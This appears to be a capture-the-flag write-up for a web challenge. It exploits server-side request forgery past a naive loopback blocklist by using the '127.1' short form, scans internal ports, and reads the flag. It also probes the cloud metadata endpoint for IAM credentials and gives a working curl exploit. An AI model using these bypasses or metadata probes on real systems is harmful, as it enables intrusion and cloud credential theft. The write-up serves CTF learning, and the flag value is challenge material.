# Internal Affairs

- **Category:** web
- **Points:** 300
- **Branch:** `chal/web-internal-affairs`
- **Target:** `http://54.72.82.22:8080`
- **Status:** ✅ SOLVED

## Flag

```
safctf{9f3a458f3a26e6372b5b5467e3e51edf}
```

Served by an internal-only service: `GET http://127.1:9000/flag`.

## Fingerprint

```
Server: Werkzeug/3.1.9 Python/3.11.16
```

Themed page: **"ORBIT DISPATCH"** space-exploration desk — "Somewhere beyond the
clouds, a new day is beginning." Body copy is a nudge: *"The night crew left a
song playing on the radio."* A single input, "URL to fetch".

## The bug: SSRF behind a naive blocklist

The page's JS POSTs to `/api/fetch`:

```js
await fetch("/api/fetch", {
  method: "POST",
  headers: {"Content-Type":"application/json"},
  body: JSON.stringify({url})
});
```

The server fetches the URL and returns `{headers, preview, status_code}`.

**Blocklist:** `127.0.0.1`, `localhost`, and `127.0.0.1.` variants are rejected
outright:

```
http://127.0.0.1/   -> {"error": "url blocked by policy"}
http://localhost/   -> {"error": "url blocked by policy"}
```

It is a **substring check on the URL string**, so anything that reaches loopback
without spelling those tokens passes. Python's socket layer still accepts the
short form **`127.1`** (an `inet_aton` abbreviation for `127.0.0.1`):

```
http://127.1/       -> connection refused (nothing listening on :80)
```

Note the classic browser tricks do **not** work here, because the host string is
handed to Python rather than to a browser or curl:

```
http://2130706433/  -> refused   (decimal form; Python does not parse it)
http://0x7f000001/  -> refused   (hex form; Python does not parse it)
```

`127.1` is the one abbreviation Python resolves.

## Exploitation

Port scan of loopback through the SSRF:

| Port | Result |
|---|---|
| 80 / 443 / 3000 / 5000 / 8080 / 8081 / 8888 / 10000 | refused |
| **8000** | `Werkzeug` — the same ORBIT DISPATCH app, internal only |
| **9000** | `BaseHTTP/0.6 Python/3.11.16` — small service, 404 on most paths |

```
POST /api/fetch {"url":"http://127.1:9000/flag"}
-> {"preview": "safctf{9f3a458f3a26e6372b5b5467e3e51edf}", "status_code": 200}
```

`/flag.txt`, `/admin`, `/status`, `/health`, `/robots.txt` on :9000 all 404 —
`/flag` is the only endpoint that matters.

## Secondary: cloud metadata is reachable

The blocklist only covers loopback. The instance metadata service is wide open:

```
POST /api/fetch {"url":"http://169.254.169.254/latest/meta-data/"}
-> ami-id, iam/, identity-credentials/, instance-id, ...

GET .../latest/meta-data/iam/security-credentials/
-> AmazonSSMRoleForInstancesQuickSetup
```

Full IMDS credentials were not harvested here — the flag service was the intended
target — but it confirms the SSRF is unrestricted on the link-local range.

## Exploit

```bash
curl -s -X POST http://54.72.82.22:8080/api/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.1:9000/flag"}'
```

See `solve.py`.
